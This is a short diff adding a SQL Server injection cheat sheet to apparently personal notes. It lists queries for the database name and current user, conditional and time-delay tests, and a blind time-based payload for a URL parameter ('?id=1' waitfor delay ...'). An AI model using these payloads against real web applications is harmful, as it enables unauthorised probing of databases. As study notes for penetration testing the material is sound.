@@ -34,3 +34,28 @@ curl -i -L
 -i, --include       Incluude protocol response headers in the output
 -L, --location      Follow redirects
 ```
+
+
+# SQL 注入
+
+## SQL Server
+https://www.w3schools.com/sql/sql_ref_sqlserver.asp
+
+```sql
+-- db name
+Select Name From Master..SysDataBases Where DbId=(Select Dbid From Master..SysProcesses Where Spid = @@spid)
+-- stack query
+-- if else
+SELECT IIF(500<1000, 'YES', 'NO');
+if (1=1) waitfor delay '00:00:1' else select 2
+-- blind
+?id=1' waitfor delay '00:00:2'--'
+
+-- current-user
+select CURRENT_USER;
+select SYSTEM_USER;
+select USER_NAME();
+
+-- functions
+ascii,char,charindex,concat,concat with +,concat_ws,datalength,difference,format,left,len,lower,ltrim,nchar,patindex,quotename,replace,replicate,reverse,right,rtrim,soundex,space,str,stuff,substring,translate,trim,unicode,upper
+```
